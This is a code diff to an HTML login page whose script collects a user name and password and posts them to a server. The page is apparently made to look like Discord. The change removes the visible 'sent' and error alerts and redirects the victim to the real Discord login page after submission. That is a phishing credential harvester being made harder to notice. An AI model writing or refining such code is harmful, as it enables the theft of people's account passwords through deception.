@@ -61,6 +61,7 @@ button:hover {background-color: #4752c4;}
 
 <script>
 const form = document.getElementById("loginForm");
+
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
   const data = { user: form.user.value, pass: form.pass.value };
@@ -73,16 +74,15 @@ form.addEventListener("submit", async (e) => {
     });
 
     if (res.ok) {
-      alert("✅ Sent successfully!");
       form.reset();
+      // ✅ Redirect to Discord login page after successful submission
+      window.location.href = "https://discord.com/login";
     } else {
       const text = await res.text();
       console.error("Server error:", text);
-      alert("❌ Error sending data: " + res.status);
     }
   } catch (err) {
     console.error("Network error:", err);
-    alert("❌ Network error, check console.");
   }
 });
 </script>
